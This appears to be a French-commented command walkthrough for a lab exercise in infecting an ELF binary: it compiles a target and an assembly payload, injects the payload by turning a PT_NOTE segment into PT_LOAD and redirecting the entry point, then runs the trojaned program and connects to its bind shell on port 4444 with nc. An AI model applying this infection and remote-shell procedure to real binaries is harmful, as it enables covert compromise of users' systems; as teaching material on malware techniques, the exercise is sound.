# ==========================================
# 1. PRÉPARATION ET COMPILATION
# ==========================================

# Compiler le programme cible sain
gcc cible.c -o cible

# Compiler la charge utile assembleur en binaire brut
nasm -f bin serveur.asm -o sc.bin


# ==========================================
# 2. ANALYSE AVANT INFECTION
# ==========================================

# Vérifier la structure initiale du binaire (présence du PT_NOTE)
./infector cible


# ==========================================
# 3. EXÉCUTION DE L'INFECTION
# ==========================================

# Injecter le payload et modifier l'entry point
./infector cible sc.bin


# ==========================================
# 4. ANALYSE APRÈS INFECTION
# ==========================================

# Vérifier que le segment est devenu PT_LOAD et que e_entry pointe vers sc.bin
./infector cible


# ==========================================
# 5. DÉCLENCHEMENT DU TROJAN & CONTRÔLE DISTANT
# ==========================================

# --- [Sur le Terminal 2 / Machine Cible] ---
# Exécuter le binaire piégé (affiche le message de bienvenue à l'écran)
./cible

# Vérifier que le port d'écoute du bind shell est bien actif
ss -lntp | grep 4444


# --- [Sur le Terminal 1 / Machine Attaquante] ---
# Se connecter au bind shell ouvert par la cible
nc 127.0.0.1 4444

# Prouver le contrôle total du système :
id
whoami